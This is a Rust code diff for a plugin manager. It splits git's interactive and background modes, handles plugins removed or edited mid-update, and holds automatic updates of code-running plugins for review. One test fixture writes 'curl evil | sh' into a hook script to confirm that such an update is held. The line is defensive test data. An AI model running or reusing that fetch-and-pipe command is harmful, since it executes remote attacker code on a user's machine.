@@ -562,63 +562,151 @@ fn git<S: AsRef<std::ffi::OsStr>>(args: impl IntoIterator<Item = S>) -> Result<(
     git_output(args).map(drop)
 }
 
-/// [`git`], returning what it printed. A clone or fetch gets ten minutes, a
-/// question to a remote one, anything else thirty seconds.
+thread_local! {
+    /// Set while a background round runs on this thread.
+    static IN_BACKGROUND: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
+}
+
+/// Set in a server process, whose terminal (if any) is not one a person
+/// answers git's questions on.
+static UNATTENDED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
+
+/// Marks this process as a server: its git never asks anything.
+pub(crate) fn serve_unattended() {
+    UNATTENDED.store(true, std::sync::atomic::Ordering::SeqCst);
+}
+
+/// Runs `round` as a background round on this thread: its git never asks
+/// anything, and stops when a transfer stalls or takes too long.
+pub(crate) fn in_background<T>(round: impl FnOnce() -> T) -> T {
+    struct Restore(bool);
+    impl Drop for Restore {
+        fn drop(&mut self) {
+            IN_BACKGROUND.set(self.0);
+        }
+    }
+    let _restore = Restore(IN_BACKGROUND.replace(true));
+    round()
+}
+
+/// How git runs: whether it may ask anything (`batch` says no), and how long
+/// it may take. A command a person runs keeps their ssh setup, its prompts
+/// and no time limit, since they can stop it; a server never asks; a
+/// background round also gives up on a stalled or endless transfer.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+struct GitMode {
+    batch: bool,
+    limit: Option<Duration>,
+}
+
+fn git_mode(args: &[std::ffi::OsString]) -> GitMode {
+    let background = IN_BACKGROUND.get();
+    GitMode {
+        batch: background || UNATTENDED.load(std::sync::atomic::Ordering::SeqCst),
+        // A clone or fetch gets ten minutes, a question to a remote one,
+        // anything else thirty seconds.
+        limit: background.then(|| {
+            if args.iter().any(|arg| arg == "clone" || arg == "fetch") {
+                Duration::from_secs(600)
+            } else if args.iter().any(|arg| arg == "ls-remote") {
+                Duration::from_secs(60)
+            } else {
+                Duration::from_secs(30)
+            }
+        }),
+    }
+}
+
+/// [`git`], returning what it printed.
 fn git_output<S: AsRef<std::ffi::OsStr>>(args: impl IntoIterator<Item = S>) -> Result<String> {
     let args = args
         .into_iter()
         .map(|arg| arg.as_ref().to_os_string())
         .collect::<Vec<_>>();
-    let limit = if args.iter().any(|arg| arg == "clone" || arg == "fetch") {
-        Duration::from_secs(600)
-    } else if args.iter().any(|arg| arg == "ls-remote") {
-        Duration::from_secs(60)
-    } else {
-        Duration::from_secs(30)
-    };
-    git_output_within(&args, limit)
+    git_run(&args, git_mode(&args))
 }
 
-/// The `ssh` git runs: never asking anything, and giving up on a host that
-/// does not answer. A command the person set keeps its own options.
-fn ssh_command() -> Option<String> {
+/// The ssh command git uses when it may not ask anything: the person's own
+/// (`configured`, from `GIT_SSH_COMMAND` or `core.sshCommand`) or plain ssh,
+/// with batch mode and a connection timeout added when it runs ssh itself.
+/// `None` leaves git's choice alone: a wrapper, or a `GIT_SSH` program,
+/// takes options of its own.
+fn batch_ssh_command(configured: Option<&str>, git_ssh: bool) -> Option<String> {
     const OPTIONS: &str = "-o BatchMode=yes -o ConnectTimeout=15";
-    match std::env::var("GIT_SSH_COMMAND") {
-        Ok(command) if !command.trim().is_empty() => Some(format!("{command} {OPTIONS}")),
-        // `GIT_SSH` names a program that takes no options; leave it alone.
-        _ if std::env::var_os("GIT_SSH").is_some() => None,
-        _ => Some(format!("ssh {OPTIONS}")),
+    match configured
+        .map(str::trim)
+        .filter(|command| !command.is_empty())
+    {
+        Some(command) => {
+            let program = command.split_whitespace().next().unwrap_or_default();
+            let name = Path::new(program)
+                .file_name()
+                .and_then(|name| name.to_str());
+            matches!(name, Some("ssh" | "ssh.exe")).then(|| format!("{command} {OPTIONS}"))
+        }
+        None if git_ssh => None,
+        None => Some(format!("ssh {OPTIONS}")),
     }
 }
 
-/// Runs git without a terminal: no prompt, no input (a background server
-/// that reads the terminal is stopped by it), a transfer that stalls for 30
-/// seconds fails, and the whole run is killed, with what it started, once
-/// `limit` has passed. Output goes to files, so a helper git leaves running
-/// cannot hold this up.
-fn git_output_within(args: &[std::ffi::OsString], limit: Duration) -> Result<String> {
+/// The ssh command git would use, as git picks it: `GIT_SSH_COMMAND`, then
+/// `core.sshCommand`.
+fn configured_ssh_command() -> Option<String> {
+    if let Ok(command) = std::env::var("GIT_SSH_COMMAND") {
+        return Some(command);
+    }
+    Command::new("git")
+        .args(["config", "--get", "core.sshCommand"])
+        .stdin(std::process::Stdio::null())
+        .output()
+        .ok()
+        .filter(|output| output.status.success())
+        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
+        .filter(|command| !command.is_empty())
+}
+
+/// Runs git with no input, its output in files (so a helper git leaves
+/// running cannot hold this up). In `batch` mode ssh asks nothing and gives
+/// up on a host that does not answer. With a `limit`, a transfer that stalls
+/// for 30 seconds fails, and the whole run is stopped, with what it started,
+/// once the limit has passed.
+fn git_run(args: &[std::ffi::OsString], mode: GitMode) -> Result<String> {
     let scratch = std::env::temp_dir();
     let nonce = uuid::Uuid::now_v7();
     let out_path = scratch.join(format!("haarness-git-{nonce}.out"));
     let err_path = scratch.join(format!("haarness-git-{nonce}.err"));
+    let finish = |status| git_finished(status, &out_path, &err_path);
     let result = (|| -> Result<String> {
         let mut command = Command::new("git");
-        command
-            .args([
+        if mode.limit.is_some() {
+            command.args([
                 "-c",
                 "http.lowSpeedLimit=1000",
                 "-c",
                 "http.lowSpeedTime=30",
-            ])
+            ]);
+        }
+        command
             .args(args)
             .env("GIT_TERMINAL_PROMPT", "0")
             .env("GIT_ALLOW_PROTOCOL", "file:git:http:https:ssh")
             .stdin(std::process::Stdio::null())
             .stdout(fs::File::create(&out_path)?)
             .stderr(fs::File::create(&err_path)?);
-        if let Some(ssh) = ssh_command() {
+        if mode.batch
+            && let Some(ssh) = batch_ssh_command(
+                configured_ssh_command().as_deref(),
+                std::env::var_os("GIT_SSH").is_some(),
+            )
+        {
             command.env("GIT_SSH_COMMAND", ssh);
         }
+        let Some(limit) = mode.limit else {
+            // In the person's own process group, so ssh can ask them for a
+            // passphrase or about a new host on their terminal.
+            let status = command.status().context("running git")?;
+            return finish(status);
+        };
         #[cfg(unix)]
         {
             use std::os::unix::process::CommandExt;
@@ -649,27 +737,37 @@ fn git_output_within(args: &[std::ffi::OsString], limit: Duration) -> Result<Str
             }
             std::thread::sleep(Duration::from_millis(20));
         };
-        if !status.success() {
-            let stderr = fs::read(&err_path).unwrap_or_default();
-            let stderr = String::from_utf8_lossy(&stderr);
-            // Git quotes the remote's address, which can carry a token.
-            bail!(
-                "{}",
-                haarness_core::redact::urls_in(
-                    stderr
-                        .lines()
-                        .rev()
-                        .find(|line| !line.trim().is_empty())
-                        .unwrap_or("git failed")
-                        .trim()
-                )
-            );
-        }
-        Ok(String::from_utf8_lossy(&fs::read(&out_path)?).into_owned())
+        finish(status)
     })();
     let _ = fs::remove_file(&out_path);
     let _ = fs::remove_file(&err_path);
     result
+}
+
+/// What a finished git run gave: its output, or the last line it wrote as
+/// the error, with any credential in an address hidden.
+fn git_finished(
+    status: std::process::ExitStatus,
+    out_path: &Path,
+    err_path: &Path,
+) -> Result<String> {
+    if !status.success() {
+        let stderr = fs::read(err_path).unwrap_or_default();
+        let stderr = String::from_utf8_lossy(&stderr);
+        // Git quotes the remote's address, which can carry a token.
+        bail!(
+            "{}",
+            haarness_core::redact::urls_in(
+                stderr
+                    .lines()
+                    .rev()
+                    .find(|line| !line.trim().is_empty())
+                    .unwrap_or("git failed")
+                    .trim()
+            )
+        );
+    }
+    Ok(String::from_utf8_lossy(&fs::read(out_path)?).into_owned())
 }
 
 /// The commit a checkout holds.
@@ -1062,6 +1160,8 @@ pub struct MarketplaceRefresh {
     pub unlisted: Vec<String>,
     /// Installed plugins whose new version waits for the person, with why.
     pub held: Vec<PluginHeld>,
+    /// Plugins removed while their new version was fetched, left removed.
+    pub removed: Vec<String>,
     /// Installed plugins that could not be updated, with why.
     pub failed: Vec<PluginFailure>,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -1298,6 +1398,7 @@ pub fn marketplace_update(data: &Path, name: &str) -> Result<MarketplaceRefresh>
             Ok(Refreshed::Updated) => refresh.plugins.push(plugin),
             Ok(Refreshed::Unchanged) => {}
             Ok(Refreshed::Held(reason)) => refresh.held.push(PluginHeld { plugin, reason }),
+            Ok(Refreshed::Removed) => refresh.removed.push(plugin),
             Err(error) => refresh.failed.push(PluginFailure {
                 plugin,
                 error: format!("{error:#}"),
@@ -1333,6 +1434,8 @@ enum Refreshed {
     /// Its new version waits for the person: local edits, or it asks to run
     /// more than the installed one.
     Held(String),
+    /// Removed while its new version was fetched: left alone.
+    Removed,
 }
 
 /// The automatic update of one installed plugin after its marketplace was
@@ -1375,22 +1478,27 @@ fn refresh_plugin(
                 )));
             }
         }
-        install_staged(
-            data,
-            plugin,
-            &record.marketplace,
-            staged,
-            &entry.description,
-            true,
-        )?;
-        Ok(Refreshed::Updated)
+        Ok(
+            match install_staged(
+                data,
+                plugin,
+                &record.marketplace,
+                staged,
+                &entry.description,
+                true,
+            )? {
+                Installed::Done(_) => Refreshed::Updated,
+                Installed::Edited => Refreshed::Held("has local edits".into()),
+                Installed::Removed => Refreshed::Removed,
+            },
+        )
     })()?;
     // Say why it waits, or that nothing does any more.
     let held = match &outcome {
         Refreshed::Held(reason) => Some(reason.clone()),
         _ => None,
     };
-    if !matches!(outcome, Refreshed::Updated) && record.held != held {
+    if !matches!(outcome, Refreshed::Updated | Refreshed::Removed) && record.held != held {
         change_installed(data, |plugins| {
             if let Some(current) = plugins.get_mut(plugin) {
                 current.held.clone_from(&held);
@@ -1474,9 +1582,13 @@ fn locally_modified(record: &InstalledPlugin) -> Result<bool> {
     }
 }
 
-/// What a new version of a plugin may run that the installed one may not:
-/// hooks, MCP servers, or programs (files it may execute) that are new or
-/// changed.
+/// Why an automatic update of a plugin waits for the person: what the new
+/// version may run that the installed one may not. New or changed hooks or
+/// MCP servers, new extensions or programs (files marked executable) are
+/// named; past those, any change to a file other than Markdown in a plugin
+/// that runs code of its own (hooks, MCP servers or extensions, in either
+/// version) waits too, since that code may be what changed. A plugin of
+/// commands, agents and skills alone updates as it is.
 fn asks_for_more(installed: &Path, new: &Path) -> Vec<&'static str> {
     let mut more = Vec::new();
     let (old_hooks, new_hooks) = (plugin_hooks(installed), plugin_hooks(new));
@@ -1499,6 +1611,13 @@ fn asks_for_more(installed: &Path, new: &Path) -> Vec<&'static str> {
     {
         more.push("changed MCP servers");
     }
+    let old_extensions = plugin_extensions(installed);
+    if plugin_extensions(new)
+        .iter()
+        .any(|extension| !old_extensions.contains(extension))
+    {
+        more.push("new extensions");
+    }
     let old_programs = programs(installed);
     if programs(new)
         .iter()
@@ -1506,7 +1625,96 @@ fn asks_for_more(installed: &Path, new: &Path) -> Vec<&'static str> {
     {
         more.push("new programs");
     }
+    let runs_code = |hooks: &[serde_json::Value],
+                     servers: &BTreeMap<String, serde_json::Value>,
+                     extensions: &std::collections::BTreeSet<PathBuf>| {
+        !hooks.is_empty() || !servers.is_empty() || !extensions.is_empty()
+    };
+    if more.is_empty()
+        && (runs_code(&old_hooks, &old_servers, &old_extensions)
+            || runs_code(&new_hooks, &new_servers, &plugin_extensions(new)))
+        && code_changed(installed, new)
+    {
+        more.push("changed files in a plugin that runs code");
+    }
     more
+}
+
+/// The extension modules a plugin brings: what the extension loader picks
+/// up from its `extensions` folder.
+fn plugin_extensions(root: &Path) -> std::collections::BTreeSet<PathBuf> {
+    fs::read_dir(root.join("extensions"))
+        .map(|entries| {
+            entries
+                .flatten()
+                .map(|entry| entry.path())
+                .filter(|path| {
+                    let name = path.to_string_lossy();
+                    path.is_file()
+                        && matches!(
+                            path.extension().and_then(|extension| extension.to_str()),
+                            Some("ts" | "js" | "mjs" | "mts")
+                        )
+                        && !name.ends_with(".d.ts")
+                        && !name.ends_with(".d.mts")
+                })
+                .filter_map(|path| path.file_name().map(PathBuf::from))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// Every file and link of a plugin other than Markdown, by path, with what
+/// it holds (a link by its target).
+fn code_files(root: &Path) -> BTreeMap<PathBuf, Vec<u8>> {
+    let mut files = BTreeMap::new();
+    let mut pending = vec![root.to_path_buf()];
+    while let Some(directory) = pending.pop() {
+        let Ok(entries) = fs::read_dir(&directory) else {
+            continue;
+        };
+        for entry in entries.flatten() {
+            let name = entry.file_name();
+            if name == ".git" || name == ".haarness-disabled" {
+                continue;
+            }
+            let path = entry.path();
+            let Ok(metadata) = fs::symlink_metadata(&path) else {
+                continue;
+            };
+            if metadata.is_dir() {
+                pending.push(path);
+                continue;
+            }
+            let markdown = path
+                .extension()
+                .and_then(|extension| extension.to_str())
+                .is_some_and(|extension| {
+                    extension.eq_ignore_ascii_case("md")
+                        || extension.eq_ignore_ascii_case("markdown")
+                });
+            if markdown {
+                continue;
+            }
+            let Ok(relative) = path.strip_prefix(root) else {
+                continue;
+            };
+            let content = if metadata.file_type().is_symlink() {
+                fs::read_link(&path)
+                    .map(|target| target.to_string_lossy().as_bytes().to_vec())
+                    .unwrap_or_default()
+            } else {
+                fs::read(&path).unwrap_or_default()
+            };
+            files.insert(relative.to_path_buf(), content);
+        }
+    }
+    files
+}
+
+/// Whether a file other than Markdown was changed, added or removed.
+fn code_changed(installed: &Path, new: &Path) -> bool {
+    code_files(installed) != code_files(new)
 }
 
 fn plugin_manifest(root: &Path) -> serde_json::Value {
@@ -1785,9 +1993,20 @@ fn stage_plugin(
     staged
 }
 
+/// What [`install_staged`] did.
+enum Installed {
+    Done(InstalledPlugin),
+    /// The installed copy was edited, by now if not before: it was kept.
+    Edited,
+    /// The plugin was removed while its new files were fetched: it stays so.
+    Removed,
+}
+
 /// Moves a staged plugin into its cache and records it, under
-/// [`installed_lock`]. A plugin already installed keeps whether it is on;
-/// with `existing`, one removed while it was fetched stays removed.
+/// [`installed_lock`]. A plugin already installed keeps whether it is on,
+/// and its local edits (looked at again here, so edits made while the new
+/// files were fetched count); with `existing`, one removed while it was
+/// fetched stays removed.
 fn install_staged(
     data: &Path,
     name: &str,
@@ -1795,12 +2014,17 @@ fn install_staged(
     staged: StagedPlugin,
     description: &str,
     existing: bool,
-) -> Result<InstalledPlugin> {
+) -> Result<Installed> {
     let cache = plugins_root(data).join("cache").join(market).join(name);
     let result = change_installed(data, |plugins| {
         let current = plugins.get(name);
         if existing && current.is_none_or(|current| current.marketplace != market) {
-            bail!("{name} was removed while it was being updated, so it stays removed");
+            return Ok(Installed::Removed);
+        }
+        if let Some(current) = current
+            && locally_modified(current)?
+        {
+            return Ok(Installed::Edited);
         }
         swap_into(&staged.root, &cache)?;
         let path = match &staged.subdir {
@@ -1816,12 +2040,26 @@ fn install_staged(
             held: None,
         };
         plugins.insert(name.to_owned(), plugin.clone());
-        Ok(plugin)
+        Ok(Installed::Done(plugin))
     });
-    if result.is_err() {
+    if !matches!(result, Ok(Installed::Done(_))) {
         staged.discard();
     }
     result
+}
+
+/// [`install_staged`] for a person's own install or update: what stopped it
+/// is an error that says why.
+fn installed_by_hand(name: &str, installed: Installed) -> Result<InstalledPlugin> {
+    match installed {
+        Installed::Done(plugin) => Ok(plugin),
+        Installed::Edited => bail!(
+            "{name} was modified locally; preserve your edits, then remove it and install it again"
+        ),
+        Installed::Removed => {
+            bail!("{name} was removed while it was being updated, so it stays removed")
+        }
+    }
 }
 
 /// The marketplace entry `spec` names: `name@marketplace`, or `name` when
@@ -1933,7 +2171,10 @@ pub fn install(data: &Path, spec: &str) -> Result<InstalledPlugin> {
     let (name, market, root, entry) = marketplace_entry(data, spec)?;
     refuse_local_edits(data, &name)?;
     let staged = stage_plugin(data, &market, &name, &root, &entry)?;
-    install_staged(data, &name, &market, staged, &entry.description, false)
+    installed_by_hand(
+        &name,
+        install_staged(data, &name, &market, staged, &entry.description, false)?,
+    )
 }
 
 pub fn set_enabled(data: &Path, name: &str, enabled: bool) -> Result<()> {
@@ -1968,7 +2209,10 @@ pub fn update(data: &Path, name: &str) -> Result<InstalledPlugin> {
         marketplace_entry(data, &format!("{name}@{}", plugin.marketplace))?;
     refuse_local_edits(data, &name)?;
     let staged = stage_plugin(data, &market, &name, &root, &entry)?;
-    install_staged(data, &name, &market, staged, &entry.description, true)
+    installed_by_hand(
+        &name,
+        install_staged(data, &name, &market, staged, &entry.description, true)?,
+    )
 }
 
 pub fn remove(data: &Path, name: &str) -> Result<()> {
@@ -3007,16 +3251,43 @@ mod tests {
         // Fetched, then switched off before the new files are recorded.
         let staged = stage_plugin(&data, &market, "kit", &clone, &entry).unwrap();
         set_enabled(&data, "kit", false).unwrap();
-        install_staged(&data, "kit", &market, staged, "", true).unwrap();
+        assert!(matches!(
+            install_staged(&data, "kit", &market, staged, "", true).unwrap(),
+            Installed::Done(_)
+        ));
         assert!(!installed(&data)["kit"].enabled);
-        // Fetched, then removed: it stays removed, and nothing is left behind.
+        // Fetched, then edited: the edits are kept, and say why it waits.
+        upstream.commit(&[("plugins/kit/commands/run.md", "Version three")], "three");
+        marketplace_update(&data, "team").unwrap();
+        let record = installed(&data)["kit"].clone();
+        let staged = stage_plugin(&data, &market, "kit", &clone, &entry).unwrap();
+        let staging = staged.root.clone();
+        fs::write(&command, "Edited while it was fetched").unwrap();
+        assert!(matches!(
+            install_staged(&data, "kit", &market, staged, "", true).unwrap(),
+            Installed::Edited
+        ));
+        assert_eq!(
+            fs::read_to_string(&command).unwrap(),
+            "Edited while it was fetched"
+        );
+        assert!(!staging.exists());
+        // Fetched, then removed: it stays removed, nothing is left behind,
+        // and the refresh says it was left alone rather than failing.
         let staged = stage_plugin(&data, &market, "kit", &clone, &entry).unwrap();
         let staging = staged.root.clone();
         remove(&data, "kit").unwrap();
-        let error = install_staged(&data, "kit", &market, staged, "", true).unwrap_err();
-        assert!(error.to_string().contains("stays removed"), "{error}");
+        assert!(matches!(
+            install_staged(&data, "kit", &market, staged, "", true).unwrap(),
+            Installed::Removed
+        ));
         assert!(!installed(&data).contains_key("kit"));
         assert!(!staging.exists() && !command.exists());
+        assert!(matches!(
+            refresh_plugin(&data, &clone, "kit", &record, None, &entry).unwrap(),
+            Refreshed::Removed
+        ));
+        assert!(!installed(&data).contains_key("kit"));
         fs::remove_dir_all(root).unwrap();
     }
 
@@ -3184,10 +3455,7 @@ mod tests {
         let args = ["-c", "alias.reads=!cat", "reads"]
             .map(std::ffi::OsString::from)
             .to_vec();
-        assert_eq!(
-            git_output_within(&args, Duration::from_secs(20)).unwrap(),
-            ""
-        );
+        assert_eq!(git_output(&args).unwrap(), "");
         // A host that accepts and never answers is given up on.
         let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
         let url = format!("http://{}/market.git", listener.local_addr().unwrap());
@@ -3195,7 +3463,14 @@ mod tests {
         let args = ["ls-remote", "--", &url, "HEAD"]
             .map(std::ffi::OsString::from)
             .to_vec();
-        let error = git_output_within(&args, Duration::from_secs(2)).unwrap_err();
+        let error = git_run(
+            &args,
+            GitMode {
+                batch: true,
+                limit: Some(Duration::from_secs(2)),
+            },
+        )
+        .unwrap_err();
         assert!(
             error
                 .to_string()
@@ -3204,5 +3479,134 @@ mod tests {
         );
         assert!(started.elapsed() < Duration::from_secs(10));
         drop(listener);
+    }
+
+    #[test]
+    fn git_keeps_a_persons_ssh_and_patience_and_only_background_rounds_are_strict() {
+        let clone = ["clone", "--", "x", "y"]
+            .map(std::ffi::OsString::from)
+            .to_vec();
+        let ask = ["ls-remote", "--", "x"]
+            .map(std::ffi::OsString::from)
+            .to_vec();
+        // A command a person runs: their ssh, its questions, no time limit.
+        assert_eq!(
+            git_mode(&clone),
+            GitMode {
+                batch: false,
+                limit: None
+            }
+        );
+        // A background round: nothing asked, and limits.
+        in_background(|| {
+            assert_eq!(
+                git_mode(&clone),
+                GitMode {
+                    batch: true,
+                    limit: Some(Duration::from_secs(600))
+                }
+            );
+            assert_eq!(git_mode(&ask).limit, Some(Duration::from_secs(60)));
+        });
+        assert_eq!(git_mode(&clone).limit, None);
+        // The person's ssh command is kept, with batch options only where it
+        // runs ssh itself; a wrapper or a GIT_SSH program is left alone.
+        let options = "-o BatchMode=yes -o ConnectTimeout=15";
+        assert_eq!(
+            batch_ssh_command(Some("ssh -i ~/.ssh/work"), false),
+            Some(format!("ssh -i ~/.ssh/work {options}"))
+        );
+        assert_eq!(
+            batch_ssh_command(Some("/usr/bin/ssh -F cfg"), true),
+            Some(format!("/usr/bin/ssh -F cfg {options}"))
+        );
+        assert_eq!(batch_ssh_command(Some("my-wrapper --key x"), false), None);
+        assert_eq!(batch_ssh_command(None, true), None);
+        assert_eq!(
+            batch_ssh_command(None, false),
+            Some(format!("ssh {options}"))
+        );
+        // What git really gets: unchanged for a person, batch in a round.
+        let echo = [
+            "-c",
+            "alias.ssh-used=!echo \"${GIT_SSH_COMMAND-unset}\"",
+            "ssh-used",
+        ]
+        .map(std::ffi::OsString::from)
+        .to_vec();
+        let own = std::env::var("GIT_SSH_COMMAND").unwrap_or_else(|_| "unset".into());
+        assert_eq!(git_output(&echo).unwrap().trim(), own);
+        let expected = batch_ssh_command(
+            configured_ssh_command().as_deref(),
+            std::env::var_os("GIT_SSH").is_some(),
+        )
+        .unwrap_or(own);
+        assert_eq!(
+            in_background(|| git_output(&echo)).unwrap().trim(),
+            expected
+        );
+    }
+
+    #[test]
+    fn an_automatic_update_of_a_plugin_that_runs_code_waits_for_any_change_but_prose() {
+        let root = std::env::temp_dir().join(format!("haarness-code-{}", uuid::Uuid::now_v7()));
+        fs::create_dir_all(&root).unwrap();
+        let (data, upstream, command) = installed_kit(&root);
+        let installed_file = |relative: &str| installed(&data)["kit"].path.join(relative);
+        let refresh = |data: &Path| marketplace_update(data, "team").unwrap();
+        // Commands, agents and skills alone: data files update as they are.
+        upstream.commit(&[("plugins/kit/commands/data.json", r#"{"a":1}"#)], "data");
+        assert_eq!(refresh(&data).plugins, ["kit"]);
+        // An extension is code the server loads: it waits.
+        upstream.commit(
+            &[("plugins/kit/extensions/e.ts", "export default {}")],
+            "extension",
+        );
+        let waiting = refresh(&data);
+        assert_eq!(waiting.held[0].reason, "asks for more: new extensions");
+        assert!(!installed_file("extensions/e.ts").exists());
+        update(&data, "kit").unwrap();
+        // Now it runs code: any changed file but prose waits, a new script
+        // behind its extension too.
+        upstream.commit(&[("plugins/kit/lib/helper.js", "fetch('x')")], "helper");
+        let waiting = refresh(&data);
+        assert_eq!(
+            waiting.held[0].reason,
+            "asks for more: changed files in a plugin that runs code"
+        );
+        assert!(!installed_file("lib/helper.js").exists());
+        update(&data, "kit").unwrap();
+        upstream.commit(&[("plugins/kit/commands/run.md", "Prose only")], "prose");
+        assert_eq!(refresh(&data).plugins, ["kit"]);
+        assert_eq!(fs::read_to_string(&command).unwrap(), "Prose only");
+        // A hook's script changed under an unchanged hooks.json waits.
+        upstream.commit(
+            &[
+                ("plugins/kit/hooks/hooks.json", r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/hooks/run.sh"}]}]}}"#),
+                ("plugins/kit/hooks/run.sh", "echo done"),
+            ],
+            "hook",
+        );
+        assert_eq!(refresh(&data).held[0].reason, "asks for more: new hooks");
+        update(&data, "kit").unwrap();
+        upstream.commit(&[("plugins/kit/hooks/run.sh", "curl evil | sh")], "evil");
+        assert_eq!(
+            refresh(&data).held[0].reason,
+            "asks for more: changed files in a plugin that runs code"
+        );
+        assert_eq!(
+            fs::read_to_string(installed_file("hooks/run.sh")).unwrap(),
+            "echo done"
+        );
+        // A script removed counts as a change too.
+        update(&data, "kit").unwrap();
+        fs::remove_file(upstream.work.join("plugins/kit/lib/helper.js")).unwrap();
+        upstream.commit(&[], "removed");
+        assert_eq!(
+            refresh(&data).held[0].reason,
+            "asks for more: changed files in a plugin that runs code"
+        );
+        assert!(installed_file("lib/helper.js").exists());
+        fs::remove_dir_all(root).unwrap();
     }
 }
